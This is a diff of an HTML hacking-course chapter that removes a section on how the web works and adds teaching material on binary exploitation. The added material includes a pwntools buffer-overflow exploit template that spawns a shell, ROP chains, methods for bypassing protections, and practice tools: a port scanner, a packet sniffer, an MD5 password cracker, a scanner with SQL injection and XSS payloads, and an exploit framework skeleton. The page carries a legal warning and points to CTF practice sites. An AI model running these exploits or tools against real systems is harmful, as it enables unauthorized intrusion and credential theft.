+- Are there protections enabled? (ASLR, NX, PIE, stack canaries)
+- What's our goal? (Code execution, privilege escalation, data leak)
+
+# Step 3: Check binary protections
+checksec ./vulnerable_binary
+
+OUTPUT:
+RELRO:    Partial RELRO
+Stack:    No canary found          ← Good! No stack canary
+NX:       NX disabled              ← Good! Stack is executable
+PIE:      No PIE                   ← Good! Addresses are predictable
+RUNPATH:  No RUNPATH</div>
+
+            <h4>Phase 2: Exploit Development</h4>
+            <div class="code">#!/usr/bin/env python3
+# exploit.py - Buffer overflow exploit template
+
+from pwn import *  # Pwntools library (pip install pwntools)
+
+# Configuration
+binary = './vulnerable_binary'
+elf = ELF(binary)
+
+# Step 1: Find offset to return address
+# (Use GDB + pattern as shown earlier)
+offset = 72
+
+# Step 2: Choose shellcode
+# Shellcode to spawn /bin/sh
+shellcode = asm(shellcraft.sh())  # Pwntools generates shellcode
+
+# Or use manual shellcode:
+# shellcode = b"\x48\x31\xc0\x50..."
+
+# Step 3: Find a JMP RSP gadget (if needed)
+# Or use return-to-libc, ROP chain, etc.
+
+# Step 4: Craft payload
+payload = flat([
+    shellcode,                    # Our shellcode
+    b'A' * (offset - len(shellcode)),  # Padding
+    p64(0x7fffffffdabc)          # Return to shellcode address
+])
+
+# Step 5: Send payload
+p = process(binary)
+p.sendline(payload)
+
+# Step 6: Interact with spawned shell
+p.interactive()</div>
+
+            <h4>Phase 3: Bypassing Protections</h4>
+            <p>Modern systems have multiple protections. Here's how to bypass them:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Protection</th>
+                        <th>What It Does</th>
+                        <th>Bypass Technique</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>NX (No-Execute)</strong></td>
+                        <td>Stack/heap not executable</td>
+                        <td>Return-Oriented Programming (ROP), return-to-libc</td>
+                    </tr>
+                    <tr>
+                        <td><strong>ASLR</strong></td>
+                        <td>Randomizes memory addresses</td>
+                        <td>Information leak to find addresses, brute force, partial overwrite</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Stack Canaries</strong></td>
+                        <td>Detects stack corruption</td>
+                        <td>Leak canary value, bypass check, overwrite canary back</td>
+                    </tr>
+                    <tr>
+                        <td><strong>PIE</strong></td>
+                        <td>Randomizes code location</td>
+                        <td>Leak code address, relative offsets still work</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RELRO</strong></td>
+                        <td>Makes GOT read-only</td>
+                        <td>Full RELRO: No GOT overwrite; Partial: Overwrite before relocation</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>Return-Oriented Programming (ROP)</h4>
+            <p>When the stack isn't executable (NX enabled), we can't run our shellcode directly. Solution: Chain together existing code snippets called "gadgets".</p>
+
+            <div class="code"># What is a ROP gadget?
+# Small instruction sequences ending in 'ret'
+
+Examples:
+pop rdi; ret        # Load value from stack into RDI
+pop rsi; ret        # Load value from stack into RSI
+mov rax, rdi; ret   # Move RDI to RAX
+syscall; ret        # Execute syscall
+
+# ROP Chain to call execve("/bin/sh", NULL, NULL):
+
+# Stack layout:
+[gadget: pop rdi; ret]    # Pop next value into RDI
+[address of "/bin/sh"]    # RDI = "/bin/sh"
+[gadget: pop rsi; ret]    # Pop next value into RSI
+[0x0000000000000000]      # RSI = NULL
+[gadget: pop rdx; ret]    # Pop next value into RDX
+[0x0000000000000000]      # RDX = NULL
+[gadget: pop rax; ret]    # Pop next value into RAX
+[0x000000000000003b]      # RAX = 59 (execve syscall)
+[gadget: syscall; ret]    # Execute syscall!
+
+# Each 'ret' pops the next address from stack and jumps to it
+# We control the stack, so we control the execution flow!</div>
+
+            <h4>Using Pwntools for Exploitation</h4>
+            <p>Pwntools is the standard Python library for exploit development:</p>
+
+            <div class="code">#!/usr/bin/env python3
+from pwn import *
+
+# ==================== BASIC USAGE ====================
+
+# Connect to process or remote server
+p = process('./binary')        # Local process
+# p = remote('ip', port)       # Remote target
+
+# Send data
+p.send(b'data')                # Send without newline
+p.sendline(b'data')            # Send with newline
+
+# Receive data
+data = p.recv(100)             # Receive 100 bytes
+data = p.recvline()            # Receive until newline
+data = p.recvuntil(b'prompt')  # Receive until specific string
+
+# Interactive shell
+p.interactive()                # Get interactive terminal
+
+# ==================== EXPLOIT HELPERS ====================
+
+# Packing integers to bytes (little-endian)
+address = p64(0x401234)        # 64-bit: b'\x34\x12\x40\x00\x00\x00\x00\x00'
+address = p32(0x401234)        # 32-bit: b'\x34\x12\x40\x00'
+
+# Unpacking bytes to integers
+value = u64(b'\x34\x12\x40\x00\x00\x00\x00\x00')  # 0x401234
+
+# Flat payload construction
+payload = flat([
+    b'A' * 64,
+    p64(0x401234),
+    p64(0x401500)
+])
+
+# ==================== SHELLCODE ====================
+
+# Generate shellcode
+shellcode = asm(shellcraft.sh())           # Spawn shell
+shellcode = asm(shellcraft.cat('flag.txt'))  # Read file
+
+# Assemble custom assembly
+shellcode = asm('mov rax, 60; xor rdi, rdi; syscall')
+
+# ==================== ROP ====================
+
+# Load binary
+elf = ELF('./binary')
+libc = ELF('./libc.so.6')
+
+# Find symbols
+main_addr = elf.symbols['main']
+system_addr = libc.symbols['system']
+
+# Find gadgets
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+
+# Build ROP chain
+rop_chain = flat([
+    pop_rdi,
+    next(elf.search(b'/bin/sh')),
+    elf.symbols['system']
+])
+
+# ==================== FULL EXPLOIT EXAMPLE ====================
+
+binary = './vuln'
+elf = ELF(binary)
+p = process(binary)
+
+# Leak addresses
+p.recvuntil(b'Address: ')
+leak = int(p.recvline().strip(), 16)
+log.info(f'Leaked address: {hex(leak)}')
+
+# Calculate base
+base = leak - 0x1234
+log.info(f'Base address: {hex(base)}')
+
+# Craft payload
+offset = 72
+payload = flat([
+    asm(shellcraft.sh()),
+    b'A' * (offset - len(asm(shellcraft.sh()))),
+    p64(base + 0x2000)  # Return to shellcode
+])
+
+# Exploit
+p.sendline(payload)
+p.interactive()  # Get shell!</div>
+
+            <div class="info-box">
+                <h4>Debugging Exploits</h4>
+                <p>When exploits fail, debug systematically:</p>
+                <ul>
+                    <li><strong>Verify offset:</strong> Is return address overwritten correctly?</li>
+                    <li><strong>Check addresses:</strong> Are they in little-endian? Correct values?</li>
+                    <li><strong>Bad characters:</strong> Does payload contain nulls or other bad chars?</li>
+                    <li><strong>Alignment:</strong> Is stack 16-byte aligned before calls?</li>
+                    <li><strong>GDB attach:</strong> <span class="inline-code">gdb.attach(p)</span> in Pwntools to debug live</li>
+                </ul>
+            </div>
+
+            <h3>Payload Crafting Techniques</h3>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>NOP Sled</h4>
+                    <p><strong>Purpose:</strong> Increase reliability of jumps to shellcode</p>
+                    <p><strong>Technique:</strong> Prepend shellcode with many NOP instructions (0x90). If we jump anywhere in the NOPs, execution slides to shellcode.</p>
+                    <p><strong>Example:</strong> <span class="inline-code">b'\x90'*100 + shellcode</span></p>
+                </div>
+                <div class="card">
+                    <h4>Egg Hunter</h4>
+                    <p><strong>Purpose:</strong> Find shellcode when buffer is too small</p>
+                    <p><strong>Technique:</strong> Inject small payload that searches memory for "egg" (unique marker) followed by real shellcode.</p>
+                    <p><strong>Use Case:</strong> Limited buffer space for initial exploit</p>
+                </div>
+                <div class="card">
+                    <h4>Staged Payloads</h4>
+                    <p><strong>Purpose:</strong> Execute larger payloads in constrained environments</p>
+                    <p><strong>Technique:</strong> Stage 1: Small payload that reads more data. Stage 2: Full featured payload sent after initial exploitation.</p>
+                    <p><strong>Example:</strong> Metasploit's staged payloads</p>
                 </div>
             </div>
         </section>
 
-        <section id="how-web-works" class="section">
-            <h2 class="section-title">How the Web Actually Works</h2>
-            <p class="section-intro">Before you can hack websites, you need to understand what happens when you type a URL and press Enter. Most people have no idea - but as a hacker, you'll see the web as a complex dance of protocols, each step a potential opportunity to intercept, modify, or exploit.</p>
+        <!-- ============================================================ -->
+        <!-- SECTION: PROJECTS & BUILDING TOOLS (COMBINED) -->
+        <!-- ============================================================ -->
+        <section class="section" id="projects">
+            <h2 class="section-title">Real-World Projects & Building Security Tools</h2>
+            <p class="section-intro">Theory is worthless without practice. The best way to solidify your exploitation skills is to build real tools and complete projects that combine everything you've learned. These projects will push you from script kiddie to genuine hacker.</p>
 
             <div class="metaphor-box">
-                <h4>🍕 The Restaurant Metaphor</h4>
-                <p>Imagine the internet as a massive city full of restaurants (websites):</p>
-                <ul style="margin-top: 1rem;">
-                    <li><strong>Your Browser</strong> = You, the customer walking into a restaurant</li>
-                    <li><strong>DNS</strong> = The phone book (converts "Pizza Place" to an actual street address)</li>
-                    <li><strong>IP Address</strong> = The restaurant's physical street address (192.168.1.1)</li>
-                    <li><strong>Port</strong> = Which door to use (front door = 80, VIP entrance = 443)</li>
-                    <li><strong>HTTP Request</strong> = Your order ("I'll have a pepperoni pizza with extra cheese")</li>
-                    <li><strong>Web Server</strong> = The kitchen that receives and prepares your order</li>
-                    <li><strong>Database</strong> = The pantry where ingredients (data) are stored</li>
-                    <li><strong>HTTP Response</strong> = Your food arriving at the table</li>
-                    <li><strong>Cookies</strong> = Your loyalty card that remembers who you are</li>
-                </ul>
-                <p style="margin-top: 1rem; color: var(--accent);">Hacking is like finding ways to get free food, sneak into the kitchen, read other people's orders, or become the manager without permission!</p>
+                <h4>🛠️ The Craftsman's Workshop</h4>
+                <p>Reading about carpentry doesn't make you a carpenter. You become a craftsman by building furniture, making mistakes, and refining your technique. Similarly, you become a hacker by building tools, writing exploits, and solving real challenges.</p>
+                <p>Every tool you build deepens your understanding. Every exploit you craft sharpens your skills. This section contains projects that will transform you from student to practitioner.</p>
             </div>
 
-            <h3>The Complete Journey of a Web Request</h3>
-            <div class="code"># You type: https://bank.com/account
+            <h3 id="building-tools">Essential Security Tools to Build</h3>
+            <p>Building these tools from scratch teaches you how they work at a fundamental level:</p>
 
-# ==================== STEP 1: URL PARSING ====================
-# Browser breaks down the URL:
-Protocol: https://          (use encryption)
-Domain:   bank.com          (who we're talking to)
-Path:     /account          (what we want)
-Port:     443               (implied by https)
+            <h4>Project 1: Port Scanner</h4>
+            <div class="code">#!/usr/bin/env python3
+# port_scanner.py - Multi-threaded port scanner
 
-# ==================== STEP 2: DNS RESOLUTION ====================
-# "What's the IP address of bank.com?"
+import socket
+import threading
+from queue import Queue
 
-Your Computer → Local DNS Cache (already know it?)
-             → Router DNS Cache (maybe router knows?)
-             → ISP DNS Server (usually knows common sites)
-             → Root DNS Servers (top of the chain)
-             → .com TLD Servers (handles all .com)
-             → bank.com Authoritative Server (final answer!)
-             
-Response: "bank.com is at 203.0.113.50"
+# Configuration
+target = '192.168.1.1'
+port_queue = Queue()
+open_ports = []
 
-# ==================== STEP 3: TCP CONNECTION ====================
-# Your computer connects to 203.0.113.50 on port 443
+def scan_port(port):
+    """Attempt to connect to a port"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((target, port))
+        
+        if result == 0:
+            try:
+                banner = sock.recv(1024).decode().strip()
+                open_ports.append((port, banner))
+                print(f'[+] Port {port}: OPEN - {banner}')
+            except:
+                open_ports.append((port, 'No banner'))
+                print(f'[+] Port {port}: OPEN')
+        
+        sock.close()
+    except:
+        pass
 
-Three-Way Handshake:
-Your PC  → [SYN]      →  Server    "Hey, want to talk?"
-Your PC  ← [SYN-ACK]  ←  Server    "Sure, I hear you!"
-Your PC  → [ACK]      →  Server    "Great, we're connected!"
+def worker():
+    """Worker thread to scan ports from queue"""
+    while not port_queue.empty():
+        port = port_queue.get()
+        scan_port(port)
+        port_queue.task_done()
 
-# ==================== STEP 4: TLS HANDSHAKE (HTTPS) ====================
-# Establishing encrypted connection
+# Main scanning logic
+print(f'Scanning {target}...')
+
+# Add ports to queue
+for port in range(1, 1025):  # Scan first 1024 ports
+    port_queue.put(port)
+
+# Create worker threads
+threads = []
+for _ in range(100):  # 100 concurrent threads
+    t = threading.Thread(target=worker)
+    t.start()
+    threads.append(t)
+
+# Wait for completion
+port_queue.join()
+
+print(f'\nScan complete. Found {len(open_ports)} open ports.')
+
+# ENHANCEMENTS TO ADD:
+# - Service detection (compare banners to known services)
+# - UDP scanning
+# - OS fingerprinting
+# - Output to file (JSON, XML, CSV)
+# - Stealth scanning (slow, randomized timing)</div>
+
+            <h4>Project 2: Packet Sniffer</h4>
+            <div class="code">#!/usr/bin/env python3
+# packet_sniffer.py - Network packet capture and analysis
+
+from scapy.all import *
+
+def packet_callback(packet):
+    """Process each captured packet"""
+    
+    if IP in packet:
+        ip_src = packet[IP].src
+        ip_dst = packet[IP].dst
+        
+        # TCP packets
+        if TCP in packet:
+            sport = packet[TCP].sport
+            dport = packet[TCP].dport
+            flags = packet[TCP].flags
+            
+            print(f'[TCP] {ip_src}:{sport} → {ip_dst}:{dport} [{flags}]')
+            
+            # Check for HTTP traffic
+            if Raw in packet and dport == 80:
+                payload = packet[Raw].load.decode(errors='ignore')
+                if 'GET' in payload or 'POST' in payload:
+                    print(f'  HTTP Request: {payload[:100]}')
+        
+        # UDP packets
+        elif UDP in packet:
+            sport = packet[UDP].sport
+            dport = packet[UDP].dport
+            print(f'[UDP] {ip_src}:{sport} → {ip_dst}:{dport}')
+        
+        # ICMP packets
+        elif ICMP in packet:
+            icmp_type = packet[ICMP].type
+            print(f'[ICMP] {ip_src} → {ip_dst} (Type {icmp_type})')
+
+# Start sniffing
+print('Starting packet capture... (Ctrl+C to stop)')
+sniff(prn=packet_callback, store=False)
+
+# ENHANCEMENTS TO ADD:
+# - Filter by protocol (only HTTP, only DNS, etc.)
+# - Save captures to PCAP file
+# - Reconstruct TCP streams
+# - Extract credentials from cleartext protocols
+# - Detect suspicious patterns (port scans, large transfers)</div>
+
+            <h4>Project 3: Password Cracker</h4>
+            <div class="code">#!/usr/bin/env python3
+# password_cracker.py - Multi-method password cracking
+
+import hashlib
+import itertools
+import string
+from multiprocessing import Pool
+
+def md5_hash(password):
+    """Calculate MD5 hash"""
+    return hashlib.md5(password.encode()).hexdigest()
+
+def crack_dictionary(target_hash, wordlist_path):
+    """Dictionary attack"""
+    print(f'[*] Attempting dictionary attack...')
+    
+    with open(wordlist_path, 'r', encoding='latin-1') as f:
+        for i, word in enumerate(f):
+            word = word.strip()
+            if md5_hash(word) == target_hash:
+                print(f'[+] PASSWORD FOUND: {word}')
+                return word
+            
+            if i % 10000 == 0:
+                print(f'  Tried {i} passwords...')
+    
+    return None
+
+def crack_brute_force(target_hash, max_length=4):
+    """Brute force attack"""
+    print(f'[*] Attempting brute force (max length {max_length})...')
+    
+    chars = string.ascii_lowercase + string.digits
+    
+    for length in range(1, max_length + 1):
+        print(f'  Trying length {length}...')
+        
+        for attempt in itertools.product(chars, repeat=length):
+            password = ''.join(attempt)
+            
+            if md5_hash(password) == target_hash:
+                print(f'[+] PASSWORD FOUND: {password}')
+                return password
+    
+    return None
+
+def crack_hybrid(target_hash, wordlist_path):
+    """Hybrid attack (dictionary + mutations)"""
+    print(f'[*] Attempting hybrid attack...')
+    
+    mutations = [
+        lambda w: w,
+        lambda w: w.capitalize(),
+        lambda w: w.upper(),
+        lambda w: w + '123',
+        lambda w: w + '!',
+        lambda w: w + '2023',
+        lambda w: w[::-1],  # Reverse
+    ]
+    
+    with open(wordlist_path, 'r', encoding='latin-1') as f:
+        for word in f:
+            word = word.strip()
+            
+            for mutation in mutations:
+                candidate = mutation(word)
+                if md5_hash(candidate) == target_hash:
+                    print(f'[+] PASSWORD FOUND: {candidate}')
+                    return candidate
+    
+    return None
+
+# Example usage
+target = '5f4dcc3b5aa765d61d8327deb882cf99'  # MD5 of 'password'
+
+# Try dictionary attack
+crack_dictionary(target, '/usr/share/wordlists/rockyou.txt')
+
+# If that fails, try brute force
+# crack_brute_force(target, max_length=6)
+
+# ENHANCEMENTS TO ADD:
+# - Support multiple hash types (SHA1, SHA256, bcrypt)
+# - GPU acceleration with hashcat integration
+# - Rainbow table support
+# - Rule-based mutations (leet speak, year appending)
+# - Distributed cracking across multiple machines</div>
+
+            <h4>Project 4: Web Vulnerability Scanner</h4>
+            <div class="code">#!/usr/bin/env python3
+# web_scanner.py - Basic web vulnerability scanner
+
+import requests
+from urllib.parse import urljoin, urlparse
+from bs4 import BeautifulSoup
+
+class WebScanner:
+    def __init__(self, target_url):
+        self.target = target_url
+        self.visited = set()
+        self.vulnerabilities = []
+    
+    def scan(self):
+        """Main scanning function"""
+        print(f'[*] Scanning {self.target}')
+        
+        # Directory enumeration
+        self.enum_directories()
+        
+        # Crawl site
+        self.crawl(self.target)
+        
+        # Test for vulnerabilities
+        for url in self.visited:
+            self.test_sql_injection(url)
+            self.test_xss(url)
+        
+        # Report
+        self.report_vulnerabilities()
+    
+    def enum_directories(self):
+        """Check for common directories"""
+        common_dirs = [
+            '/admin', '/login', '/backup', '/config',
+            '/uploads', '/api', '/test', '/.git'
+        ]
+        
+        print('[*] Enumerating directories...')
+        for dir_path in common_dirs:
+            url = urljoin(self.target, dir_path)
+            try:
+                r = requests.get(url, timeout=3)
+                if r.status_code == 200:
+                    print(f'  [+] Found: {url}')
+                    self.vulnerabilities.append({
+                        'type': 'Directory Disclosure',
+                        'url': url,
+                        'severity': 'Info'
+                    })
+            except:
+                pass
+    
+    def crawl(self, url, depth=2):
+        """Crawl website to find pages"""
+        if depth == 0 or url in self.visited:
+            return
+        
+        self.visited.add(url)
+        print(f'  Crawling: {url}')
+        
+        try:
+            r = requests.get(url, timeout=5)
+            soup = BeautifulSoup(r.text, 'html.parser')
+            
+            # Find all links
+            for link in soup.find_all('a', href=True):
+                next_url = urljoin(url, link['href'])
+                
+                # Only crawl same domain
+                if urlparse(next_url).netloc == urlparse(self.target).netloc:
+                    self.crawl(next_url, depth - 1)
+        except:
+            pass
+    
+    def test_sql_injection(self, url):
+        """Test for SQL injection"""
+        payloads = ["'", "1' OR '1'='1", "1' AND '1'='2"]
+        
+        for payload in payloads:
+            test_url = url + '?id=' + payload
+            try:
+                r = requests.get(test_url, timeout=3)
+                
+                # Check for SQL errors in response
+                errors = ['sql', 'mysql', 'syntax error', 'database']
+                if any(err in r.text.lower() for err in errors):
+                    self.vulnerabilities.append({
+                        'type': 'SQL Injection',
+                        'url': test_url,
+                        'severity': 'Critical'
+                    })
+                    print(f'  [!] SQL Injection found: {url}')
+                    break
+            except:
+                pass
+    
+    def test_xss(self, url):
+        """Test for XSS"""
+        payload = '<script>alert(1)</script>'
+        test_url = url + '?q=' + payload
+        
+        try:
+            r = requests.get(test_url, timeout=3)
+            
+            if payload in r.text:
+                self.vulnerabilities.append({
+                    'type': 'Cross-Site Scripting (XSS)',
+                    'url': url,
+                    'severity': 'High'
+                })
+                print(f'  [!] XSS found: {url}')
+        except:
+            pass
+    
+    def report_vulnerabilities(self):
+        """Print final report"""
+        print(f'\n{"="*50}')
+        print(f'SCAN RESULTS: {len(self.vulnerabilities)} vulnerabilities found')
+        print(f'{"="*50}\n')
+        
+        for vuln in self.vulnerabilities:
+            print(f'[{vuln["severity"]}] {vuln["type"]}')
+            print(f'  URL: {vuln["url"]}\n')
+
+# Usage
+scanner = WebScanner('http://example.com')
+scanner.scan()
+
+# ENHANCEMENTS TO ADD:
+# - More vulnerability checks (CSRF, XXE, SSRF, etc.)
+# - Authentication bypass testing
+# - API endpoint discovery and testing
+# - Report generation (HTML, PDF)
+# - Parallel scanning for speed</div>
+
+            <h3>CTF-Style Challenge Projects</h3>
+            <p>Complete these progressively harder challenges to test your skills:</p>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>Beginner: Crack the Binary</h4>
+                    <p><strong>Challenge:</strong> Reverse engineer a simple binary that checks a password. Find the password without source code.</p>
+                    <p><strong>Skills:</strong> GDB, assembly reading, string analysis, basic reverse engineering.</p>
+                    <p><strong>Tools:</strong> GDB, strings, ltrace, strace</p>
+                </div>
+                <div class="card">
+                    <h4>Intermediate: Exploit Stack Overflow</h4>
+                    <p><strong>Challenge:</strong> Exploit a vulnerable C program with a buffer overflow. Protections: None (NX disabled, no ASLR, no canary).</p>
+                    <p><strong>Skills:</strong> Buffer overflows, shellcode injection, payload crafting.</p>
+                    <p><strong>Tools:</strong> GDB, Python, Pwntools</p>
+                </div>
+                <div class="card">
+                    <h4>Advanced: Bypass DEP with ROP</h4>
+                    <p><strong>Challenge:</strong> Exploit a buffer overflow with NX enabled. Must use ROP chain to execute code.</p>
+                    <p><strong>Skills:</strong> ROP chains, gadget finding, advanced exploitation.</p>
+                    <p><strong>Tools:</strong> ROPgadget, pwntools, GDB</p>
+                </div>
+                <div class="card">
+                    <h4>Expert: Full ASLR Bypass</h4>
+                    <p><strong>Challenge:</strong> Exploit with ASLR, NX, and PIE enabled. Must leak addresses first.</p>
+                    <p><strong>Skills:</strong> Information leaks, ASLR bypass, complex ROP chains.</p>
+                    <p><strong>Tools:</strong> Full exploitation toolkit</p>
+                </div>
+            </div>
+
+            <h3>Capstone Project: Build Your Own Exploit Framework</h3>
+            <p>The ultimate project: Build a mini exploitation framework similar to Metasploit but focused on learning.</p>
+
+            <div class="code">#!/usr/bin/env python3
+# exploit_framework.py - Simplified exploit framework
+
+class ExploitModule:
+    """Base class for exploit modules"""
+    
+    def __init__(self):
+        self.name = 'Base Exploit'
+        self.description = 'Base exploit module'
+        self.target = None
+        self.payload = None
+    
+    def check(self):
+        """Check if target is vulnerable"""
+        raise NotImplementedError
+    
+    def exploit(self):
+        """Execute the exploit"""
+        raise NotImplementedError
+
+class BufferOverflowExploit(ExploitModule):
+    """Example: Buffer overflow exploit module"""
+    
+    def __init__(self):
+        super().__init__()
+        self.name = 'Generic Buffer Overflow'
+        self.description = 'Exploits stack buffer overflow vulnerabilities'
+        self.offset = 0
+        self.return_address = 0
+    
+    def set_target(self, target):
+        self.target = target
+    
+    def set_payload(self, payload):
+        self.payload = payload
+    
+    def set_offset(self, offset):
+        self.offset = offset
+    
+    def set_return_address(self, addr):
+        self.return_address = addr
+    
+    def check(self):
+        # Send test payload and check for crash
+        test_payload = b'A' * 100
+        # ... implementation ...
+        return True
+    
+    def exploit(self):
+        # Build exploit payload
+        payload = self.payload + b'A' * (self.offset - len(self.payload))
+        payload += self.return_address.to_bytes(8, 'little')
+        
+        # Send payload
+        # ... implementation ...
+        
+        print(f'[+] Exploit sent!')
+        return True
+
+class PayloadGenerator:
+    """Generate various payloads"""
+    
+    @staticmethod
+    def reverse_shell(ip, port):
+        # Generate reverse shell shellcode
+        pass
+    
+    @staticmethod
+    def bind_shell(port):
+        # Generate bind shell shellcode
+        pass
+    
+    @staticmethod
+    def exec_command(command):
+        # Generate command execution shellcode
+        pass
+
+class ExploitFramework:
+    """Main framework class"""
+    
+    def __init__(self):
+        self.modules = {}
+        self.current_module = None
+    
+    def register_module(self, module):
+        self.modules[module.name] = module
+    
+    def list_modules(self):
+        print('Available Exploit Modules:')
+        for name, module in self.modules.items():
+            print(f'  {name}: {module.description}')
+    
+    def use_module(self, name):
+        if name in self.modules:
+            self.current_module = self.modules[name]
+            print(f'[*] Using module: {name}')
+        else:
+            print(f'[-] Module not found: {name}')
+    
+    def exploit(self):
+        if self.current_module:
+            print(f'[*] Launching exploit: {self.current_module.name}')
+            self.current_module.exploit()
+        else:
+            print('[-] No module selected')
+
+# Framework usage
+framework = ExploitFramework()
+
+# Register modules
+framework.register_module(BufferOverflowExploit())
+
+# Interactive console
+while True:
+    cmd = input('exploit> ').strip()
+    
+    if cmd == 'list':
+        framework.list_modules()
+    elif cmd.startswith('use '):
+        framework.use_module(cmd[4:])
+    elif cmd == 'exploit':
+        framework.exploit()
+    elif cmd == 'exit':
+        break
+
+# FEATURES TO ADD:
+# - More exploit modules (format string, heap, UAF)
+# - Multiple payload types (reverse shell, bind shell, etc.)
+# - Target database (store info about vulnerable targets)
+# - Automated exploitation (try multiple techniques)
+# - Session management (handle multiple shells)
+# - Post-exploitation modules (privilege escalation, persistence)</div>
+
+            <h3>Practice Resources & Next Steps</h3>
+
+            <div class="info-box">
+                <h4>Where to Practice These Skills</h4>
+                <ul>
+                    <li><strong>PicoCTF:</strong> Beginner-friendly CTF with binary exploitation challenges</li>
+                    <li><strong>pwnable.kr:</strong> Dedicated to binary exploitation, progressive difficulty</li>
+                    <li><strong>HackTheBox:</strong> Realistic machines with exploitation components</li>
+                    <li><strong>Exploit-Exercises:</strong> VMs specifically for learning exploitation (Protostar, Fusion)</li>
+                    <li><strong>ROP Emporium:</strong> Learn return-oriented programming step-by-step</li>
+                    <li><strong>Nightmare:</strong> Free binary exploitation course with challenges</li>
+                </ul>
+            </div>
+
+            <div class="warning-box">
+                <h4>⚠️ Legal and Ethical Considerations</h4>
+                <p><strong>Never exploit systems without permission.</strong> Everything in this chapter is for educational purposes and should only be used on:</p>
+                <ul>
+                    <li>Your own systems and VMs</li>
+                    <li>Authorized CTF platforms and challenges</li>
+                    <li>Bug bounty programs with clear scope</li>
+                    <li>Penetration testing with signed contracts</li>
+                </ul>
+                <p>Unauthorized exploitation is illegal and unethical. Use these skills responsibly to defend systems, not attack them.</p>
+            </div>
+
+            <h3>Building Your Hacker Portfolio</h3>
+            <p>As you complete projects, document them:</p>
+
+            <ul>
+                <li><strong>Create a GitHub:</strong> Publish your tools and exploits (redact sensitive info)</li>
+                <li><strong>Write Walkthroughs:</strong> Blog about challenges you solved and how</li>
+                <li><strong>Contribute to Projects:</strong> Submit bug fixes or features to security tools</li>
+                <li><strong>Participate in CTFs:</strong> Join team CTFs and document your solutions</li>
+                <li><strong>Share Knowledge:</strong> Help beginners, answer questions, create tutorials</li>
+            </ul>
+
+            <p>Your portfolio demonstrates practical skills to employers and the security community. Build it consistently, and opportunities will follow.</p>
+        </section>
+
+        <div style="margin-top: 6rem; padding-top: 3rem; border-top: 1px solid var(--border); display: flex; justify-content: space-between;">
+            <a href="hacking-ch05.html" style="color: var(--text2); text-decoration: none;">← Chapter 05: Network Penetration</a>
+            <a href="hacking-ch07.html" style="color: var(--text); text-decoration: none; font-weight: 600;">Next: Chapter 07 - Web Exploitation →</a>
+        </div>
+    </main>
+
+    <script>
+        window.addEventListener('scroll', () => {
+            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
 
 Client Hello:  "I support TLS 1.3, these ciphers..."
 Server Hello:  "Let's use TLS 1.3 with AES-256-GCM"
